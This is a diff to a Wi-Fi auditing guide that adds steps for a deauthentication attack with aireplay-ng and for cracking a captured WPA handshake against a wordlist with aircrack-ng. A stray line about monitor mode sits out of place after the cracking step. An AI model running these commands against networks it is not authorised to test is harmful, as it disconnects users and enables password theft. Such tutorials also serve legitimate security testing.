@@ -104,13 +104,17 @@ airodump-ng -c [channel] --bssid [BSSID] -w  [filename] wlan0
 ```
 Replace `[channel]`, `[BSSID]`, and `[filename]` with the appropriate values.
 
+#### 4. Deauthentication Attack
+   To capture a handshake, deauthenticate a connected device:
 ```bash
 aireplay-ng --deauth 10 -a [BSSID] wlan0
 ```
-
+#### 5. Crack the Password
+   Once you have captured a handshake, use `aircrack-ng` to try and crack the password:
 ```bash
 aircrack-ng capture.cap -w [wordlist]
 ```
+Replace `[wordlist]` with a path to a wordlist file.
 
 You should see "Mode:Monitor" next to your wireless interface.
 
